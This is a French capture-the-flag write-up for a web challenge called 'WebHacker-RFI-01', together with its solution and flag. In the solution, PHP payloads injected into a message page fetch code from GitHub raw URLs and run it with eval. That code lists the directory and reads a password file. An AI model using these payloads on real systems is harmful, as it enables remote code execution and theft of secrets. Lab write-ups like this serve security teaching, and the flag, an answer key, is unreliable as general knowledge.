# Titre : WebHacker-RFI-01

# Catégorie : WEB

## Équipe : WEB

## Personnes : Christophe G-A, Marius V

## Description - Énoncé :

La légende raconte qu'un espace de type sandbox serait présent. Mais le vil admin à changé la politique de messages et maintant filtre d'avantage les messages. n'hésitez pass à demander de l'aide à votre propre compagnion 'GitHub' !!

# Solution :

On arrive sur une page permettant d’afficher des messages mais en réalité elle permet l'exécution de code php notamment (bloque les balises script et l'exécution de commandes serveur)
ici l’objectif est de liste les fichiers du dossier courant et d’afficher le contenu de superpassword.secured et ce avec des commandes php, mais contrairement au challenge 6 on ne peut pas utiliser la command scandir() ou afficher le nom du fichier contenant le flag il faut donc utiliser une attaque par RFI , on peut donc rentrer ces commandes :

<?php if (($code = file_get_contents('https://raw.githubusercontent.com/suirham/corporation/main/folderscan')) !== false) eval($code); ?>
puis
<?php if (($code = file_get_contents('https://raw.githubusercontent.com/suirham/corporation/main/affichercontenu')) !== false) eval($code); ?>

## ces commandes sont issue de deux pages github :

## scandir : url : https://raw.githubusercontent.com/suirham/corporation/main/folderscan contenu : echo join("\\n", array_diff(scandir('.'), ['.', '..']));

## file get contents : url : https://raw.githubusercontent.com/suirham/corporation/main/affichercontenu contenu : echo file_get_contents("superpassword.secured");

ou alors on peut faire son propre espace en ligne pour aller chercher du code

# URL de connexion : ...../vr06/

# flag : OmgUrSoGood

# Docker (Merci de commenter votre Dockerfile):

- [x] oui :
  - Explication du fonctionnement du docker : "docker-compose"
- [ ] non